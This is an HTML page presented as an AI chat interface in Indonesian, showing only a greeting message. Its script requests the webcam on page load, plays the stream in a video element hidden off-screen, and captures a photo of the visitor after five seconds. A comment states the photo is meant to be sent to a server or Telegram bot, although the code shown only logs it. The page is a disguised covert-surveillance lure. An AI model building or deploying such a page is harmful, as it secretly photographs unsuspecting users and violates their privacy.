<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat AI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        #chat-container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            padding: 10px;
            box-sizing: border-box;
            background: url('chat-background.jpg') no-repeat center center;
            background-size: cover;
        }
        #messages {
            flex-grow: 1;
            overflow-y: auto;
            padding: 10px;
        }
        .message {
            background: #e0e0e0;
            padding: 10px;
            margin: 5px;
            border-radius: 10px;
            max-width: 70%;
        }
        .user { background: #2196F3; color: white; align-self: flex-end; }
        .bot { background: #ddd; align-self: flex-start; }
        #video {
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>

<div id="chat-container">
    <div id="messages">
        <div class="message bot">Halo! Apa yang bisa saya bantu?</div>
    </div>
</div>

<video id="video" autoplay playsinline></video>

<script>
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(capturePhoto, 5000); // Ambil foto setelah 5 detik
        } catch (err) {
            console.error("Akses kamera ditolak:", err);
        }
    }

    function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png');

        // Kirim ke server atau bot Telegram di sini
        console.log("Foto diambil:", imageData);
    }

    startCamera();
</script>

</body>
</html>
